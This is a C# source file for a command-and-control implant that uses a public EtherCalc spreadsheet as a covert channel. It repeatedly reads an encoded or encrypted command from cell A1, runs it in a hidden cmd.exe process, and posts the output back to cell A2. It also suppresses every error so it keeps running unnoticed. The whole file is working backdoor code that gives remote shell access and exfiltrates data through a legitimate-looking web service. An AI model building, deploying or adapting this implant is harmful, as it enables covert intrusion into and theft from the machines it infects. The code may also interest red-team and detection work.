using ethercalc_c2;
using System;
using System.IO;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Web;

class Program
{
    static string url = $"https://ethercalc.net/_/{Configuration.ETHERCALC_ID}.{Configuration.ETHERCALC_SHEET.ToString()}";

    static void WriteCell(string cell, string value)
    {
        string json = "{\"command\":\"set " + cell + " text t " + value + "\"}";
        byte[] data = Encoding.UTF8.GetBytes(json);

        var req = (HttpWebRequest)WebRequest.Create(url);
        req.Method = "POST";
        req.ContentType = "application/json";
        req.ContentLength = data.Length;

        using (var s = req.GetRequestStream())
            s.Write(data, 0, data.Length);

        req.GetResponse().Close();
    }

    static string ReadCell(string cell)
    {
        using (var wc = new WebClient())
        {
            string json = wc.DownloadString(url + "/cells/" + cell);

            Match m = Regex.Match(json, "\"datavalue\":\"([^\"]*)\"");
            return m.Success ? m.Groups[1].Value : null;
        }
    }

    static string Exec(string cmd)
    {
        var p = new System.Diagnostics.Process
        {
            StartInfo = new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c " + cmd)
            {
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            }
        };

        p.Start();
        string output = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
        p.WaitForExit();

        return output;
    }

    static void Main()
    {
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

        // Command checksum to avoid running the same command twice.
        string commandChecksum = "";

        while(true)
        {
            try
            {
                // Delay.
                Thread.Sleep(Configuration.CHECKIN_DELAY);

                // Fetch the data from the cell
                string command = ReadCell("A1");

                // Decrypt or decode
                if (Configuration.USE_ENCRYPTION)
                {
                    command = Crypto.decrypt(command, Configuration.ENCRYPTION_KEY);
                }
                else
                {
                    command = Encoding.UTF8.GetString(Convert.FromBase64String(command));
                }

                if (Crypto.md5(command) != commandChecksum && command.Length > 1)
                {
                    commandChecksum = Crypto.md5(command);
                    string output = Exec(command);

                    if (Configuration.USE_ENCRYPTION)
                    {
                        WriteCell("A2", Crypto.encrypt(output, Configuration.ENCRYPTION_KEY));
                    }
                    else
                    {
                        WriteCell("A2", Convert.ToBase64String(Encoding.UTF8.GetBytes(output)));
                    }
                }
            }
            catch { }
            
        }
    }
}